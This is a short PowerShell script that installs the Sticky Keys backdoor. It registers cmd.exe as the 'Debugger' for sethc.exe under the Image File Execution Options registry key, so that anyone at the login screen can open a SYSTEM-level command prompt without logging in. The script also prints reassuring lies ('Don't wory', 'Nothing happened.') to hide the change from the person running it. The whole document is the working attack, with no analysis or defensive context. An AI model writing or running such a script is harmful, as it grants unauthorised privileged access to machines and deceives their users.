$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\"
$keyName = "sethc.exe" 
$stringName = "Debugger"
$binaryValue = "C:\Windows\System32\cmd.exe"

write-host "Don't wory"
New-Item -Path $registryPath -Name $keyName | Out-Null
New-ItemProperty -Path ($registryPath + $keyName) -Name $stringName -Value $binaryValue | Out-Null
write-host "Nothing happened."